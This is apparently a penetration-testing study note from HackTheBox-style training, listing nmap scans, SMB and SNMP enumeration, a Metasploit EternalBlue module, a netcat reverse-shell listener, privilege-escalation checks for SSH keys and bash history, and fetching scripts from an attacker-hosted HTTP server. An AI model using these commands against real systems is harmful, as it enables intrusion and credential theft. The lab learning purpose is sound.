
Tags: #nmap #Enumeration #SMB #FTP #SNMP #WebSecurity #Metasploit #PrivEsc #tools 



## Tools
- Gobuster
- FFuF
- EyeWhitness
- Whatweb
- exploitdb
- searchsploit

## Links

- [Reverse Shell Cheat Sheet - Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)


Risk Management Process
![[risk_management_process.png]]



About Nmap 
- `-sV` Scan for Versions
-  `-sC` Using scripts for scan  
- `-p-` Scanning all 65'535 ports
- `nmap --script <script name> -p <port> <host>` to run specific nmap scripts 
- `nmap --script smb-os-discovery.nse -p445 <ip>` to check for EternalBlue vulnerability


Banner Grabbing:
- `nc -nv <ip> 21`
- `curl -IL https://www.inlanefreight.com`

About smb
- `smbclient \\\\ip\\users`

About SNMP
- `snmpwalk -v 2c -c public <ip> ...`


## Web Enumeration

- Gobuster 
- FFUF
- Subdomain scanning

## Public Exploits 


```
msfconsole
search exploit eternalblue
use exploit/windows/smb/ms17_010_psexec

```

## Shells

```
nc -lvnp 1234 #listen with Netcat on a port for the reverse shell
```


## PrivEsc


```
dpgk -l #check installed software
sudo -l 
```

- Scheduled Tasks
	- /etc/crontab
	- /etc/cron.d
	- /var/spool/cron/crontabs/root

- Exposed Credentials
	- config files
	- log files
	- bash_history

- SSH Keys 
	- /home/user/.ssh/id_rsa
	- /root/.ssh/
	- /home/user/.ssh/authorized_keys



## Filetransfers 


```
python3 -m http.server 8000

wget http://<ip:8000/linenum.sh


## If you cant transfer files, you can encoded it in base64 and send it as string 
base64 shell -w 0

## Validating transfer 
file shell
md5sum shell
```




## HTB - Nibble 


```bash
nmap -sV --open -oA nibbles_initial_scan <ip> 
nmap -p- --open -oA nibbles_full_tcp_scan <ip> 

nmap -sC -p 22.80 -oA nibbbles_script_scan <ip>

# Getting a TTY shell
python3 -c 'import pty; pty.spawn("/bin/bash")
```




## Helpers in General 


```bash
sudo netstat -rn 


```




## Excercises 


commands required `netstat -antlp
`